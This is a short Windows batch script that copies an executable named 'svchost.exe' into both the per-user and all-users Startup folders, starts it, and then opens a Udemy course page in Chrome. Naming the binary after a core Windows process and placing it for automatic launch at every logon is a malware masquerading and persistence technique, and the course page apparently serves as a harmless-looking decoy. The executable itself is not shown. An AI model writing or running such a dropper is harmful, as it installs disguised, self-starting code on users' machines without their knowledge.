echo f|xcopy /f ".\svchost.exe" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" 

start explorer "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\svchost.exe"

echo f|xcopy ".\svchost.exe" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp" 



start chrome -app=https://www.udemy.com/full-stack-mobile-developer-course-ios-11-and-android-o/learn/v4/